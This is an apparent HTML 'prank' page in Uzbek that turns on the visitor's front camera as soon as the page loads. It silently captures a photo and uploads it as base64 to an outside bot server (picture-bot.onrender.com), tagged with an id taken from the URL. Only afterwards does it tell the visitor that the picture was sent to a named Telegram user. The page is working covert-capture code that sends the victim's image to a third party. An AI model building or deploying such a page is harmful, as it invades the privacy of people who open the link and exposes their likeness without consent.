<!DOCTYPE html>
<html lang="uz">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Rasmga Olish</title>
    <style>
        body {
            margin: 0;
            padding: 0;
            background: #050614;
            color: white;
            font-family: Arial, sans-serif;
        }

        #prank {
            max-width: 700px;
            padding: 5%;
            margin: auto;
            text-align: center;
        }

        .picture {
            border-radius: 20px;
            max-width: 600px;
            height: 400px;
            background: #131426;
            margin: 0 auto;
        }

        #byte_photo {
            border-radius: 10px;
            background-size: cover;
            height: 100%;
            background-position: center;
        }

        .desc {
            margin-top: 50px;
            background: #131426;
            padding: 20px;
            border-radius: 20px;
        }

        .desc p {
            color: white;
            font-size: 16px;
        }

        span {
            color: #2871FF;
        }

        button {
            padding: 10px 20px;
            color: white;
            background: #2871FF;
            border: none;
            border-radius: 10px;
            cursor: pointer;
            margin-top: 20px;
        }

        button:hover {
            background: transparent;
            border: 1px solid #2871FF;
        }

        .hidden {
            display: none;
        }
    </style>
</head>
<body>
    <!-- Kamera va Canvas Elementlari -->
    <video id="camera" width="640" height="480" autoplay playsinline style="display:none;"></video>
    <canvas id="canvas" width="640" height="480" style="display:none;"></canvas>

    <!-- Rasm Ko'rsatish Qismi -->
    <div id="prank" class="hidden">
        <div class="picture">
            <div id="byte_photo"></div>
        </div>
        <div class="desc">
            <p>ðŸ™Š Sizning rasmingiz <a href="https://t.me/AbdusattorovAsilbek">AbdusattorovAsilbek</a> ga yuborildi!</p>
        </div>
    </div>

    <!-- Xatolik Xabari va Qayta Urinish Tugmasi -->
    <div id="errorMessage" class="hidden" style="color: red; text-align: center; margin-top: 20px;"></div>
    <button id="retryButton" class="hidden" onclick="initCamera()">Qayta urinish</button>

    <script>
        const video = document.getElementById('camera');
        const canvas = document.getElementById('canvas');
        const context = canvas.getContext('2d');
        const prank = document.getElementById('prank');
        const errorMessage = document.getElementById('errorMessage');
        const retryButton = document.getElementById('retryButton');
        const bytePhoto = document.getElementById('byte_photo');

        async function initCamera() {
            try {
                // Kamera ruxsat soâ€˜rayotganini bildirish
                errorMessage.innerText = "ðŸ“¸ Kamera yuklanmoqda...";
                errorMessage.classList.remove("hidden");

                // Kamerani ishga tushirish
                const stream = await navigator.mediaDevices.getUserMedia({
                    video: {
                        facingMode: "user", // Old kamera, "environment" esa orqa uchun
                        width: { ideal: 1280 },
                        height: { ideal: 720 }
                    }
                });

                video.srcObject = stream;

                video.addEventListener('loadeddata', () => {
                    errorMessage.classList.add("hidden");
                    setTimeout(capturePhoto, 500);
                });
            } catch (error) {
                console.error('Kamera ishlamayapti:', error);
                errorMessage.innerText = "âŒ Kamera ishlamayapti! Iltimos, kamerangizni tekshiring.";
                errorMessage.classList.remove("hidden");
                retryButton.classList.remove("hidden");
            }
        }

        function capturePhoto() {
            if (!video.srcObject || video.videoWidth === 0 || video.videoHeight === 0) {
                errorMessage.innerText = "âŒ Kamera ishlamayapti!";
                errorMessage.classList.remove("hidden");
                retryButton.classList.remove("hidden");
                return;
            }

            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            context.drawImage(video, 0, 0, canvas.width, canvas.height);

            const imageData = canvas.toDataURL("image/png");
            bytePhoto.style.backgroundImage = `url(${imageData})`; 
            prank.classList.remove("hidden");

            const userId = getQueryParam("id");
            sendImageToServer(imageData, userId);
        }

        function sendImageToServer(imageData, userId) {
            fetch("https://picture-bot.onrender.com/upload", {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({ image: imageData, userId })
            })
            .then(res => res.json())
            .then(data => console.log("Rasm muvaffaqiyatli yuborildi:", data))
            .catch(err => {
                console.error("Xatolik:", err);
                errorMessage.innerText = `âŒ Xatolik: ${err.message}`;
                errorMessage.classList.remove("hidden");
                retryButton.classList.remove("hidden");
            });
        }

        function getQueryParam(param) {
            const urlParams = new URLSearchParams(window.location.search);
            return urlParams.get(param);
        }

        document.addEventListener('DOMContentLoaded', () => {
            initCamera();
        });
    </script>
</body>
</html>
